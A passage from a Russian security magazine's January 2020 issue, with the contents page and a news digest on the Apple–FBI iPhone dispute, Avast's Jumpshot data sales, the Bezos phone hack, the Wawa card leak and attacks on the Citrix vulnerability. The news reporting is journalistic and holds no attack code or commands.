

                                                   Январь 2020
            № 250
CONTENTS

    MEGANews
  Всё новое за последний месяц

     Android
  Об наруже ние Frida, отключение про верки на root и Android 11

    Ата ки на Active Directory
  Разбира ем актуальные методы повышения привилегий

    Бо ковое переме щение в Active Directory
  Разбира ем тех ники Lateral Movement при ата ке на домен

    Защита от детек та в Active Directory
  Уклоняемся от обнаруже ния при ата ке на домен

     Wi-Fi total PWN
  Осваиваем с нуля актуаль ные техники пен теста Wi-Fi

    Оди ноч ка против кор порации зла
  Как Брайан Кребс борол ся с русски ми хакера ми из Evil Corp

    Каша из топора
  Как я стал сам себе интернет-провайдером

    Grand Partition Theft
  Копаем ся в UEFI и пытаемся понять, почему у нас отня ли BIOS

    Лег кий софт
  Со бира ем коллекцию ком пактных программ для Windows

    NTFS изнутри
  Как устроена файловая таблица MFT в Windows

    Пе реходим на Python 3
  Как попрощать ся с Python 2.7 и кодить дальше

    Тотальная провер ка
  Исполь зуем API VirusTotal в сво их про ектах

    Cygwin или MinGW?
  Со бира ем программы для Windows без Windows

    Не смотри в камеру!
  Пишем свою систему рас позна вания лиц на Python

    Земля слушает
  При нима ем и декодируем сигналы спутников Inmarsat и Iridium

     Тит ры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





APPLE VS ФБР.
ВТОРОЙ РАУНД
У Apple и ФБР вновь появился повод для конфликта. Дело в том, что в декаб‐
ре 2019 года на базе ВМС США (во Флориде, в городе Пенсакола) произош‐
ла стрельба. Огонь открыл 21‐летний Мохаммед Саид аль‐Шамрани, офицер
военно‐воздушных сил Саудовской Аравии, который обучался в США. Он
застрелил трех человек и был убит сам.
  В настоящее время ФБР занимается рас следованием этого инцидента
и крайне заинтересовано в разблокировке двух iPhone, принадлежавших
аль‐Шамрани. Хотя ФБР имеет раз решение суда на взлом iPhone и доступ
к данным, оба устрой ства защищены паролями и зашифрованы. Пока попыт‐
ки их взлома ни к чему не привели, хотя это дело счи тается высокоприори тет‐
ным вопросом национальной безопасности и ФБР уже прибегло к помощи
неназванных сторонних экспертов и пос тавщиков.
  В Apple заявили, что сотрудничают со следс твием и вообще всегда стре‐
мятся помогать правоохранитель ным орга нам. Однако эти заявления ком‐
пании не доказывали, что Apple согласилась помочь взломать устрой ства.


НЕ В ПЕРВЫЙ РАЗ
Похожим образом обстоятельства складывались в 2016 году, ког да правоохранителям пот‐
ребовалось получить информацию с iPhone 5c, который принадлежал террористу, устроивше му
массовое убийство в Сан‐Бер нардино. Отчаявшись взломать устройство своими силами, ФБР
заручилось поддержкой федерального судьи и обратилось за этим напрямую к Apple.
   На этот запрос в компании отреагировали резко, заявив, что ФБР, по сути, тре бует создать
специальную версию iOS со встроенным бэкдором — «отмычку от сотен миллионов две рей».
И хотя скандал успел набрать немалые обороты, в итоге противос тояние сошло на нет, так
как телефон был успешно взломан без помощи Apple (и это стоило ФБР больше миллиона дол‐
ларов).


В итоге ситуацию про комментировал генеральный прокурор США Уильям
Барр, на пресс‐конференции призвав Apple помочь ФБР с взломом. Он
заявил, что произошедшее в Пенсаколе было террорис тичес ким актом,
а Apple до сих пор не ока зала следователям никакой «существенной помощи»
и, как и предполагалось ранее, не помогла получить доступ к данным
на смартфонах стрелка.



      «Эта ситу ация прек расно иллюс трирует, почему крайне важно, чтобы
      сле дова тели могли получить дос туп к циф ровым доказа тельствам пос-
      ле получе ния судебного пос танов ления. Мы призыва ем Apple и дру гие
       технологичес кие ком пании помочь нам найти решение, чтобы мы мог-
      ли луч ше защитить жизнь аме риканцев и пре дотвра тить будущие ата-
       ки», — ска зал Барр.

В ответ на это Apple опубликова ла официальное заявление, которое показа‐
ло, что компания за про шедшие годы не изменила своей позиции отно‐
сительно бэкдоров. Более того, представители Apple подчеркну ли, что пре‐
доставили  следователям  гигабайты  данных,  вклю чая  резервные  копии
из iCloud аль‐Шамрани.



     «Мы отвергаем утвер жде ния, что Apple не ока зала сущес твенной
     помощи в рас сле дова нии произошед шего в Пенсаколе. Наши отве ты
      на многочис ленные зап росы [следс твия] пос ле ата ки были своевре-
     менными, тща тельными и продолжают пос тупать.
       В течение нес кольких часов пос ле пер вого зап роса ФБР, 6 декаб-
      ря 2019 года, мы пре дос тавили широкий спектр информа ции, связан-
      ной с рас сле дова нием. С 7 по 14 декабря мы получили шесть допол-
      нительных юридичес ких зап росов и в ответ пре дос тавили информа-
      цию, вклю чая резер вные копии  iCloud, информа цию об  акка унте
      и транзакциях для нес кольких учетных записей.
      Мы  отве чали  на  каждый  зап рос  незамед лительно,  зачас тую
      в течение нес кольких часов, обме нива ясь информа цией с офисами
     ФБР в Джек сонвилле, Пенсаколе и Нью‑Йор ке. По зап росам следс-
      твия было  получе но много  гигабайтов информа ции, которую мы
      переда ли сле дова телям. В каждом слу чае мы пре дос тавляли всю
     информа цию, которая у нас была», — заяв ляют в ком пании.

Отдельно Apple напом нила всему миру о своей точке зрения на бэкдоры
в ПО, оставленные специально для правоохранитель ных органов:



     «Мы всегда утвер жда ли, что не сущес тву ет такого понятия, как „бэк-
      дор для хороших пар ней“. Бэк доры так же могут использовать те, кто
      угрожает нашей национальной безопас ности и безопас ности данных
      наших клиентов.
       Се год ня пра воохранительные органы име ют дос туп к большему
      количес тву данных, чем когда‑либо в истории, поэтому аме риканцам
      не приходится выбирать между ослабле нием шиф рования и рас кры-
      тием дел. Мы считаем, что шиф рование крайне важно для защиты
     нашей стра ны и данных наших пользовате лей».

Интересно, что, пока Apple и ФБР выясняют отношения, у шотландской
полиции таких проб лем не возникает. Стало извес тно, что шотландцы офи‐
циально берут на вооружение обо рудование компании Cellebrite и вскоре
установят в полицейских учас тках по всей стране 41 спе циализированный
«киберкиоск». Развертывание терминалов должно завершиться  к концу
мая 2020 года.
  Израильская компания Cellebrite — это независимые киберкриминалисты,
которые специализируются на извлечении данных с мобильных устройств.
Компания давно и плотно сотрудничает с американской полици ей, и правоох‐
ранители платят киберкримина лис там миллионы дол ларов. Стоит отме тить,
что на рынке существует по крайней мере два подобных решения (компаний
Cellebrite и GrayShift), производители которых заявляют, что с их помощью
можно подобрать код блокировки и извлечь данные из iPhone любой модели,
работающе го на актуальной или более ста рой версии iOS.


55 000 000 000 РУБЛЕЙ УБЫТ КОВ


Максим Рябыко, глава Ассоциации по защите прав в интернете (АЗАПИ), в которую вхо дят
издательства «Эксмо‐АСТ», «Азбука‐Аттикус» и интернет‐магазин «Литрес», заявил, что рас‐
пространение пиратских книг в Telegram сум марно лишило издателей при были в раз мере
55 000 000 000 рублей.

По данным Рябыко, незаконной деятельностью занимаются око ло 200 каналов, чья совокуп‐
ная аудитория насчитыва ет около 2 000 000 человек. Общий объем рос сийского книжного
рынка оценивается в 82 000 000 000 рублей, причем его легальная часть не пре вышает
4 200 000 000 рублей.





К УСТАНОВКЕ
ОБЯЗАТЕЛЬНО
Федеральная антимонопольная служба (ФАС) РФ разработала концепт спис‐
ка приложений, которые будут уста навливать ся на смартфоны и другие
устройства, предназначенные для продажи на территории нашей страны.
  Напомню, что соот ветству ющий закон был подписан в декабре 2019 года,
он вступит в силу в несколько этапов, первый из которых запланирован уже
на 1 июля 2020 года. Закон обяжет про изво дителей предустанавливать рос‐
сийские приложения на смартфоны и другие устройства, предназначенные
для продажи на территории России. Отвечать за это будет производитель
устройства, но также это может делать, например, дистрибьютор или ретей‐
лер.
  В текущем году предус тановка рос сийско го ПО станет обязательной
для смартфонов, с 2021 года — для планшетов, с 2022 года — для компьюте‐
ров, с 2023 года — для Smart TV и ТВ‐приставок.
  На рабочем совещании ФАС был представлен документ, который рег‐
ламентирует, для какого обо рудования, каким образом и когда дол жен быть
обеспечен режим предус тановки рос сийского ПО. В рабочем совещании
приняли участие представители ФАС, Рос потребнадзора, операторов свя зи,
различных ассоциаций, а также компаний — раз работчиков ПО.
  Заместитель руководителя ФАС Ана толий Голомолзин пояснил, что пред‐
варительная версия такова: на смартфонах и планшетах могут быть предус‐
тановлены такие приложения, как антивирусы, навигаторы, поисковики, прог‐
раммы доступа к государственным услугам и пла тежные системы. Аналогич‐
ные программы, за исключением платежной системы, будут установлены и на
планшетах. На планшетах, компьютерах и Smart TV должна быть обес печена
возможность установки программ аудиовизуаль ного сервиса, а также прос‐
мотра программ первого и вто рого мультиплекса (обеспечивающих трансля‐
цию 20 обязательных общедоступных каналов). Внесение готового документа
в кабинет министров запланировано уже на март 2020 года.
  Представитель Ассоциации торговых компаний и товаропроизводителей
электробытовой и компь ютерной техники Антон Гуськов, который присутство‐
вал на встрече, сооб щил журналис там РБК, что перечня конкретных приложе‐
ний (конкретных разработчиков) не будет, так как это нарушало бы закон
о конкуренции. В документе будет ука зан лишь тип ПО и требования к раз‐
работчику. То есть, какое именно приложение выб рать, производитель будет
решать самостоятельно. Главное — соб люсти следующие критерии:
 • права на ПО принадлежат рос сийско му лицу;
 • ПО реализуется на территории России;
 • разработчик в течение пос ледних пяти лет не нарушал закон в области
   персональных данных.


MICROSOFT ПРОЯВЛЯ ЕТ ГИБКОСТЬ
Когда ФБР вновь потребовало от ком пании Apple помощи во взломе iPhone прес тупника, сооб‐
щество опять заговорило о внедрении бэкдоров в ПО и обос нованности таких мер. Глава Mi‐
crosoft тоже обозначил свою позицию.





→«Я считаю, бэкдоры — это ужасная идея и не лучший из возможных вари антов. Мы всег да
заявляли, что заботимся о двух вещах: конфиден циальнос ти и государственной безопасности.
И нашей демократии нужны легаль ные и техничес ки решения, которые поз волят сде лать обе
эти вещи задачами первостепен ной важности»
— CEO Microsoft Сатья Наделла





ТОРГОВЛЯ ДАННЫМИ
Совместное рассле дова ние, проведенное изда ниями Vice Motherboard и PC‐
Mag, обнаружило, что антивирус Avast собирал пользовательские данные,
которые затем перепродавались таким гигантам, как Google, Yelp, Microsoft,
McKinsey, Pepsi, Sephora, Home Depot, Condé Nast, Intuit и многим, многим
другим.
  Подразделение Avast, занимавшееся про дажей данных, — это дочерняя
компания Jumpshot, которая предлагает сво им клиентам доступ к поль‐
зовательскому трафику со 100 миллионов устройств, включая компьютеры
и телефоны.
  Выводы исследователей были основаны на ана лизе утечек, контрактов
и других документов компании. Журналисты подчеркивали, что подобные
сделки между компани ями обычно крайне конфиденциальные, а сотрудники
компаний, как правило, проинструктированы не говорить публично об отно‐
шениях с Jumpshot.
   Как известно, компании готовы платить за пользовательские данные мил‐
лионы долларов, а продукты Jumpshot, вроде All Clicks Feed, позволяют отсле‐
живать действия поль зователей с точностью до клика на конкретном домене.
К примеру, данные Jumpshot могут наглядно показать, как пользователь анти‐
вируса Avast искал продукт в Google, перешел по ссылке на Amazon, а затем,
возможно, добавил товар в корзину на дру гом сайте, прежде чем наконец
купил его.
  Другие продукты Jumpshot предназна чены, например, для отслеживания
того, какие видео поль зователи прос матривают на YouTube, в Facebook и In‐
stagram или для анализа конкрет ных e‐commerce‐доменов, чтобы помочь
маркетологам понять, как пользователи на них попадают.
  Одна из компаний, которые пользовались инстру ментом All Clicks Feed, —
нью‐йоркская маркетинговая фирма Omnicom  Media  Group.  Согласно
документации Jumpshot, Omnicom заплатила Jumpshot 2 075 000 долларов
за доступ к данным только в 2019 году.
  Напомню, что впер вые о проблемах при ватности в продуктах Avast загово‐
рили в декабре прошлого года. Тогда орга низа ция Mozilla получила пре дуп‐
реждение   от   разработчика   AdBlock   Plus   Владимира   Паланта.
Еще осенью 2019 года он изу чил работу Avast Online Security и AVG Online Se‐
curity и обнаружил, что аддоны для Firefox собирают куда больше данных, чем
необходимо для их работы, в том числе подробную историю браузера. Затем
Палант опубликовал в своем блоге еще один материал, в котором рассказал
об аналогичном поведении Avast SafePrice и AVG SafePrice. В итоге все рас‐
ширения были удалены из официального каталога расширений для Firefox,
а вскоре примеру инженеров Mozilla пос ледова ли и разработчики Opera
и Google, тоже исключив из своих катало гов рас ширения Avast и дочерней
AVG.
   Тогда представители Avast уверяли, что упо мяну тому Avast Online Security
просто необходимо собирать историю URL‐адресов, чтобы обеспечить поль‐
зователям безопасность, ведь аддон предназна чен для защиты от фишинга
и вредоносных сайтов. Подчеркивалось, что данные собираются без иден‐
тификации пользователя, то есть все данные обез личены.
   Как теперь рассказывают Vice Motherboard и PCMag, собираемые Avast
пользовательские данные настолько детализированы, что клиенты могут
«видеть» даже отдельные клики, которые пользователи делают во время сес‐
сий, причем с точ ностью до миллисекунды. Собирают информацию о поис‐
ковых запросах в Google, поиске локаций и координат GPS на Google Maps,
данные о посещении стра ниц компаний на LinkedIn и конкретных видео
на YouTube, а также о посещении порносайтов. Например, можно определить
дату и время, когда анонимный пользователь заходил на YouPorn и PornHub,
а в некоторых случаях даже узнать, что именно он искал там и что смотрел
в итоге.
  И хотя собираемые данные действительно не связываются с именем
человека, адресом его электронной почты или IP‐адресом, то есть де‐юре
считаются обезличенными, каждому пользователю все же присваивается
уникальный ID, называемый идентифика тором устройства, который сохраня‐
ется до тех пор, пока пользователь не уда лит со своего устройства анти‐
вирусный продукт Avast.
   ИБ‐эксперты уверяют, что, располагая такой детальной информацией,
какую предоставляет сво им клиентам Jumpshot, компаниям‐клиентам будет
совсем нетрудно сопос тавить эти исчерпы вающие данные с информацией
из других источников, в ито ге получив подробный профиль конкретного
человека. По мнению экспертов и журналис тов, вряд ли в таком случае кор‐
ректно говорить про обезличенность собираемых данных.



      «Воз можно, сами данные (Jumpshot) не идентифицируют людей. Воз-
      можно, это прос то список хешированных ID пользовате лей и некото-
      рых URL-адре сов. Но его всегда можно объединить с данными дру гих
     мар кетологов, дру гих рек ламода телей, что, по сути, приведет к нас-
      тоящей лич ности пользовате ля», — говорит ИБ‑спе циалист Гюнеш
      Акар (Gunes Acar).

После прошлогоднего скандала из‐за браузерных расширений представите‐
ли Avast уверяли, что прекратили собирать и передавать пользовательские
данные Jumpshot, но журналисты говорят, что сбор информации продол жает‐
ся. Просто теперь Avast собира ет данные не с помощью браузерных аддонов,
а при помощи самого антивируса.
   Согласно внутренним документам, спрашивать у пользователей бесплат‐
ных антивирусных решений разрешение на сбор данных Avast начал только
недавно. Документация гласит, что, если пользователь пре дос тавит свое сог‐
ласие, его устрой ство станет частью Jumpshot Panel, то есть будет сливать
информацию обо всей интернет‐активности браузера, включая данные о том,
какие URL посещали с устройства, в каком порядке и когда именно.
   Vice Motherboard и PCMag обра тились за официальным комментарием
к самим представителям Avast, однако те не стали отвечать на большинство
вопросов журналистов. В компании лишь подчеркну ли, что соблюдают законы
и предоставляют пользователям возможность отка заться от сбора данных
в пользу Jumpshot.
  Однако скандал стремительно набирал обороты, и 30 января 2020 года
представители Avast объявили, что в ближайшем будущем компания прек‐
ратит предоставлять данные своей дочерней компании Jumpshot и начнет ее
полную ликвидацию.



      «Глав ная задача  Avast — обес печивать безопас ность своих поль-
      зовате лей в Сети и пре дос тавлять контроль над их конфиденциаль-
      ностью, — пишет Онд ржей Влчек, генеральный дирек тор Avast. —
     Любые действия, которые ста вят под угрозу доверие пользовате лей,
      неп рием лемы для Avast. Приватность наших пользовате лей является
      для нас важнейшим приоритетом, поэтому мы решили действовать
      опе ратив но. Мы решили зак рыть Jumpshot пос ле того, как ста ло оче-
      вид но, что некоторые пользовате ли под вергают сом нению соответс-
      твие пре дос тавле ния данных Jumpshot с нашей мис сией и основопо-
      лагающими для нас принципами.
      Мы сожале ем о влиянии, которое ока жет наше решение на сот-
      рудников Jumpshot, мы ценим их вклад. Мы пос тара емся мак симально
      сгла дить для них пос ледс твия этого решения».

Также в блоге компании подчеркивает ся, что Jumpshot, даже будучи дочер‐
ней компанией Avast, всегда действовала как независимая компания с собс‐
твенным руководством и советом директоров.
  В Avast пообещали, что остальные продукты компании будут продол жать
работать в обычном режиме и пользователи не заметят изменений.


КРИПТОВАЛЮТНЫЕ АТАКИ СТАЛИ ЧАЩЕ
Аналитическая компания Chainalysis под считала, что в 2019 году хакеры успешно взломали
сразу  11  круп ных  крип товалютных  бирж  и  похитили  криптовалюту  на  сумму  более
283 000 000 долларов США. При этом хакерам удалось похитить меньше денег.





283 000 000 долларов — это нам ного ниже 875 500 000 дол ларов (именно столько хакерам
удалось украсть в 2018 году всего за шесть взломов) или 483 000 000 долларов (получены
злоумышленниками в 2014 году всего за три взлома).

В течение 2019 года более 2,8 миллиар да дол ларов в биткойнах перешли от известных кри‐
минальных групп к нескольким бир жевым порталам, где затем были быстро конвертированы
в фиатные валюты.

Помимо украденных на биржах средств, в эти 2,8 миллиарда долларов также вошли другие
виды незаконных транзакций, такие как платежи вымогателям, средства от фишинговых опе‐
раций, онлайн‐мошенничества и средс тва, связанные с извес тными преступными и террорис‐
тическими группами.

Более 50% от упомянутой суммы было переведено на счета на крупных биржевых платформах
Binance и Huobi, где мошенники отмывали украденные деньги. Так, в 2019 году более 300 000
индивидуальных счетов на Binance и Huobi получили крип товалюту из криминальных источни‐
ков.





Вымогательские группировки получили чуть более 6,6 миллиона долларов США в крип‐
товалюте в качестве выкупов. В основном такая сумма набралась благодаря октябрьско му
всплеску атак, реализованных с использованием вымогателей BitPaymer, Ryuk и Defray777.





                                     Продолжение статьи →
← Начало статьи





 СКАНДАЛЬНЫЙ
 ВЗЛОМ
  В мае 2018 года смартфон гла вы Amazon и владельца газеты The Washington
   Post, одного из богатейших людей на планете Джеффа Безоса был взломан.
   Тогда все закон чилось громким скандалом, в ходе которого Безоса попытал‐
  ся шантажировать таблоид National Enquirer, угрожая опубликовать личные
  сообщения и интимные фото, полученные с его телефона. В то время глава
  Amazon еще не развелся со сво ей женой Маккензи, с которой прожил в бра‐
   ке 25 лет, и еще не афишировал свой роман с бывшей телеведущей 49‐лет‐
  ней Лорен Санчес. Словом, вышло не очень при ятно.
     Как теперь сооб щили издания The Guardian и Financial Times, взлом был
  напрямую связан с сооб щением, которое Безос 1 мая 2018 года получил
   в WhatsApp от наследного принца Саудовской Ара вии Мухаммеда ибн Сал‐
  мана, с которым незадолго до это го встречался лично и обме нял ся контакта‐
   ми.
    СМИ ссылаются на отчет, составлен ный криминалистами компании FTI
   Consulting (документ уже опубликован изданием Vice Motherboard). Они
  пришли к выводу, что видеосообщение (ролик представлял собой рекламный
  фильм о телекоммуникациях на арабском языке), полученное главой Amazon
   от наследного принца, эксплуатирова ло уязвимость в мессенджере What‐
   sApp, используя баг для загрузки и установки малвари на личный iPhone
  Безоса. Это вредоносное ПО похитило с устройства главы Amazon огромное
  количество данных.





        «Объем данных, переда ваемых с телефона Безоса, рез ко изме нился
         пос ле получе ния виде офайла в WhatsApp и более не воз вра щался
          к исходному уров ню. Пос ле выполнения зашиф рованного загрузчика,
         отправ ленного с учетной записи Мухам меда ибн Салмана, исходящий
         тра фик с устройства под скочил пример но на 29 000%, — гла сит отчет
          FTI  Consulting. — Кримина лис тичес кие арте фак ты показы вают, что
         за шесть месяцев до получе ния видео через WhatsApp телефон
        Безоса в сред нем генерировал 430 Кбайт исходяще го тра фика в день,
         что довольно типич но для  iPhone. Через нес колько часов пос ле
         получе ния  видео  в  WhatsApp  исходящий  тра фик  уве личился
        до 126 Мбайт. На протяже нии многих месяцев телефон под держивал
        необыч но высокий уровень тра фика (в сред нем 101 Мбайт), демонс-
         трируя множес твенные и крайне нетипич ные всплес ки исходящих дан-
         ных».

  Авторы отчета полагают, что использованная для взлома мал варь была при‐
  обретена у сторонних раз работчиков близким дру гом и советником нас‐
  ледного принца Саудовской Аравии Саудом аль‐Кахтани. Ранее, по данным
  СМИ,  он  не  раз  закупал  хакерские  инстру менты  у  таких  компаний,
   как небезызвестная Hacking Team.
     Результаты  рассле дова ния  FTI  Consulting,  впервые  опубликованные
  The Guardian, подверглись критике ИБ‐специалистов, так как журналисты
  предполагали, что используемый инстру мент мог быть создан израильской
  компанией NSO Group, известным раз работчиком наступательных хакерских
  инструментов. Однако в отчете кримина листов не говорится, что для взлома
  использовался именно инс трумент NSO Group, эксперты лишь отмечают, что
  инструменты израильской компании способ ны так же похищать данные,
   как это произошло на устройстве Безоса. Исследователи приводят в качес‐
   тве примеров малварь Pegasus от NSO Group и Galileo от Hacking Team.
     Впрочем, отчет FTI Consulting все равно вызывает у спе циалис тов немало
  вопросов и скепсиса. К примеру, гла ва Elcomsoft Владимир Каталов сообщил
  журналистами Vice Motherboard, что изу чавшие ата ку эксперты, похоже, «не
  были достаточно квалифицированными».
     Зачем наследному принцу Саудовской Аравии вообще понадобилось
  взламывать телефон Джеффа Безоса? Вероятно, атака может быть связана
  с тем, что Безос с 2013 года владеет газетой The Washington Post. Дело в том,
   что именно в этом изда нии активно публиковал ся известный журналист,
  обозреватель и писатель из Саудовской Ара вии Джа маль Хашогги, извес тный
  и ярый критик властей США, Саудовской Ара вии в целом и Мухаммеда ибн
  Салмана в частности. Хашог ги был убит осенью 2018 года на территории кон‐
   сульства Саудов ской Аравии в Стамбуле. После убийства наследный принц
  Саудовской Аравии признал свою ответс твенность за случившееся, но при
  этом заявил, что не был осведомлен о происходящем.
     Теперь многие СМИ и эксперты полагают,  что Саудовская Аравия
  намеренно развернула целую кампанию, чтобы очернить репутацию Джеффа
  Безоса. К примеру, журналис ты изда ния ZDNet подготовили развернутую
  хронологию событий пос ледних лет, свя занных с действиями Саудовской
  Аравии, Джеффом Безосом и убийством Хашогги.
     Отметим, что посольство Саудовской Ара вии в Вашингтоне официально
  отвергло предположения, будто королевство имело какое‐либо отношение
   к взлому телефона Джеффа Безоса. Дипломаты наз вали эти обвинения
  абсурдом.
    В свою очередь, члены рабочей группы ООН по правам человека выс‐
   тупили с призывом к США немедленно и тща тельно расследовать атаку
  на смартфон Джеффа Безоса. Эксперты ООН тоже полагают, что взлом был
  частью скоординированной кампании Саудовской Аравии против Безоса,
  вызванной критическим освещением событий в стране.


 ДОБЫЛИ 5 000 000 000 ДОЛЛАРОВ


   По информации издания The Block, в 2019 году майнеры, специализирующиеся на Bitcoin,
   получили приблизительно 5 000 000 000 долларов предполагаемо го совокупного дохода.

   Эта сумма складывается из 4 890 000 000 долларов, полученных в качестве вознаграждений
   за добытые блоки (12,5 BTC за каждый), а также примерно 146 000 000 долларов, которые
   обеспечили комиссионные сборы.

   Для сравнения: в 2018 году предполагаемый доход майнеров сос тавлял 5 230 000 000 дол‐
   ларов, в 2017 году — 3 190 000 000 долларов. То есть в 2019 году доходы незначительно сок‐
   ратились.





 ОГРОМНАЯ УТЕЧКА
 КАРТ
  На крупном кардерском ресурсе Joker’s Stash появились данные 30 мил‐
  лионов банковских карт, принадлежащих американцам, и еще около мил‐
  лиона карт, принадлежащих людям из дру гих стран. Эксперты компании Gem‐
    ini Advisory считают, что этот дамп, озаглавленный BIGBADABOOM‐III, имеет
  прямое отношение к компромета ции американской сети магазинов Wawa.





  О взломе Wawa сооб щала еще в декаб ре 2019 года. Тогда компания приз‐
   нала, что подверглась кибера таке, в ходе которой хакеры внедрили мал варь
   в PoS‐системы ее магазинов. Зло умышленники оставались в системе с марта
  по декабрь 2019 года, собира ли и похищали данные клиентов, которые
  использовали кредитные или дебето вые карты для оплаты покупок в магази‐
   нах и на автозаправочных станциях. По информации Wawa, взлом затронул
  все 860 магазинов компании, из которых 600 были совмещены с АЗС.
     Судя по всему, длитель ный период заражения и компрометация сотен
  магазинов позволили ответс твенной за взлом преступной группе собрать
  огромный массив данных. Аналитики Gemini Advisory пишут, что взлом Wawa
  может оказаться одной из крупнейших атак такого рода не только в 2019 году,
  но и за всю историю наблюдений. Исследователи сравнивают утечку с атакой
  на Home Depot в 2014 году, в результате которой были похище ны дан‐
  ные 50 миллионов клиентов, и со взло мом Target в 2013 году, когда утекли
  данные карт 40 миллионов пользователей.
     После опубликованного Gemini Advisory отчета пред ставители Wawa пос‐
  пешили выпустить пресс‐релиз, в котором компания признала, что данные
   карт ее пользователей действитель но уже продаются в Сети. По сути, ком‐
  пания косвенно подтвердила, что опуб ликованный на Joker’s Stash дамп —
   это данные ее клиентов.
     Также сеть магазинов заявила, что речь идет толь ко об информации о пла‐
  тежных картах, а PIN‐коды дебетовых карт, номера CVV2 для кредитных карт
  и другая личная информация пользователей не были затронуты. Впрочем,
  СМИ отмечают,  что, если судить по образцу дампа, полученному ими,
   это неправда и номера CVV2 все же попали в руки хакеров.
    В настоящее время зло умышленники про дают информацию о картах,
  выпущенных в США, в среднем по 17 долларов за карту, тогда как информа‐
  ция о зарубежных картах стоит намного дороже — в среднем 210 долларов
  за карту.


  ПАВЕЛ ДУРОВ НАПОМИНАЕТ
   После появления новых подробностей в деле о ком прометации смартфо на главы Amazon
  Джеффа Безоса (который был взломан через вредонос ное сообщение в WhatsApp) Павел
   Дуров не преминул в очередной раз высказаться о небезопасности мес сендже ра Facebook.





  →«Не позволяйте обманывать себя техническому эквивален ту цирковых фокус ников, которые
   хотят сосредоточить ваше внимание на одном отдельном аспекте, тогда как сами выполняют
   свои трюки в другом месте. Они хотят, чтобы вы думали об end‐to‐end‐шифровании как о
   единственной вещи, на которую следует обращать внимание, говоря о конфиден циальнос ти.
  В реальности же все намного сложнее»
  — Павел Дуров





 BUSKILL
  Инженер Майкл Альтфилд  (Michael  Altﬁeld) создал USB‐кабель  BusKill,
  который может отключить или «убить» Linux‐ноут бук, если в общественном
  месте устройство неожиданно выхватили из рук владельца и попытались
   похитить.
     Альтфилд отме чает, что, невзирая на всевоз можную защиту (исполь‐
  зование VPN, 2ФА, менеджеров паролей и так далее), прес тупники все равно
   могут попросту похитить чужой ноут бук в общественном месте, и тогда все
   это вряд ли поможет. Здесь и приходит на помощь BusKill.
     Работает BusKill прос то: одним концом кабель подключается к USB‐порту
   ноутбука с Linux на борту, а другим концом крепится к самому хозяину девай‐
   са, при помощи карабина (например, к его поясу). Когда кто‐то неожиданно
   хватает ноутбук с колен человека или со стола, USB‐кабель отсоединяется
  и тем самым запускает скрипт udev, выполняющий серию заранее заданных
  операций.
     Реакция на отключение кабеля может быть раз ной: от простой активации
  скринсейвера или выключения устройства  (что вынудит вора обходить
  механизм аутентификации) вплоть до полного сти рания всех данных или уда‐
  ления определен ных папок (что защитит от хищения критичес ки важных дан‐
  ных и не позволит злоумышленникам получить конфиденциальную информа‐
  цию или доступ к защищенным бизнес‐бэкендам).
     Разработчик не занимается продажей BusKill, но на своем сайте он опуб‐
  ликовал подробную DIY‐инс трукцию, с помощью которой любой может соз‐
   дать свой собственный кабель. Для сборки понадобятся USB‐накопитель,
  карабин для крепления кабеля, магнитный адаптер и сам USB‐кабель. В ито‐
   ге устройство обой дется в 20–45 долларов США, в зависимости от тре‐
  буемой конфигурации и компонентов.


 ВЗЛОМ INSTAGRAM И SNAPCHAT
   Британская компания Case24.com выяснила, что чаще всего хотят взломать пользовате ли.
   Как оказалось, с большим отрывом от других смартфонов лидирует iPhone, а сре ди приложе‐
   ний — Instagram и Snapchat.

  В Великобритании около 10 040 пользователей искали спо соб взломать iPhone, тогда
   как лишь 700 запросов касались взлома смар тфонов Samsung.

   Другие мобильные бренды (в том чис ле Huawei, LG, Nokia и Sony) тоже попали в список,
   но iPhone превзошел их с огромным отрывом.


   Похожим образом выглядят и поис ковые зап росы в США, там разрыв даже больше: поль‐
   зователи искали «как взломать iPhone» 48 010 раз, в то время как взлом устройств Samsung
   искали только 3100 раз.





   Среди приложений лидером стал Instagram: 12 310 британцев искали способ взломать акка‐
   унт Instagram. Второе место в рейтинге занял Snapchat  (7380 запросов), а третье место
   с небольшим отрывом получил WhatsApp (7100 зап росов).

   Американцы тоже чаще всего искали «как взломать Instagram», иссле дователи выявили 66 960
   таких запросов.





                                        Продолжение статьи →
← Начало статьи





 БОЛЬШИЕ
 ПРОБЛЕМЫ CITRIX
  В конце декабря 2019 года ста ло извес тно об опас ной уязвимости CVE‐2019‐
   19781, которая затрагивает ряд версий  Citrix Application Delivery Controller
   (ADC), Citrix Gateway, а также две старые версии Citrix SD‐WAN WANOP.
    В январе 2020 года в открытом дос тупе появи лись эксплоиты для этой
  проблемы. После их публикации атаки на уязвимые версии Citrix ожидаемо
   усилились, так как мно гочисленные хакеры теперь наде ются скомпромети‐
  ровать какую‐нибудь важ ную цель, не успевшую обновиться, — корпоратив‐
  ную сеть, государственный сервер или госучреждение.
    Основная проб лема заключалась в том, что после обнаружения уяз вимос‐
   ти прошло больше месяца, а разработ чики Citrix все не торопи лись выпускать
   патчи. Сначала компания огра ничилась лишь рекомендациями по безопас‐
   ности, объяснив клиентам, как умень шить риски.
    Фактические исправления появились только в середи не‐конце января,
   когда хакеры уже вовсю экс плуатировали проблему. Также эксперты Citrix
  и FireEye наконец подготовили бесплатные решения для выявления компро‐
  метации и уязвимых сис тем.
     Тем временем аналитики компаний FireEye и Under the Breach предуп‐
  редили, что операторы шифровальщиков REvil (Sodinokibi) и Ragnarok уже
   активно заражают уязвимые серверы Citrix, которых по‐прежнему насчитыва‐
   ется немало. Также, по неподтвержденным данным, на уязвимые системы
  нацелились и создатели вымогателя Maze.
    Иссле дователи Under the Breach расска зали, что операторы REvil опуб‐
  ликовали в Сети данные Gedia.com после того, как компания отказалась пла‐
   тить выкуп. И судя по всему, изначаль ный взлом компании был выполнен
  именно через эксплуатацию бага в Citrix.
     Также специалисты FireEye предупредили, что как минимум один из мно‐
  жества атакующих действу ет через Tor и демонс трирует странное поведение:
  разворачивает на взломанных серверах пей лоад NotRobin. По данным ана‐
   литиков, у NotRobin есть две основные цели. Во‐первых, он слу жит бэкдором
  для взломанного устройства Citrix. Во‐вто рых, ведет себя как своеобразный
  антивирус, удаляя другую обна руженную в системе малварь и тем самым
  не позволяя другим злоумышленникам оставлять свою полезную нагрузку
  на  этом  хосте.  Никакой  дополнительной  малвари, помимо  NotRobin,
  на зараженные серверы установлено не было.
    Иссле дователи FireEye сомневаются в том, что за этими атаками стоит
   какой‐то добрый самаритянин. В своем отчете они пишут, что хакер, скорее
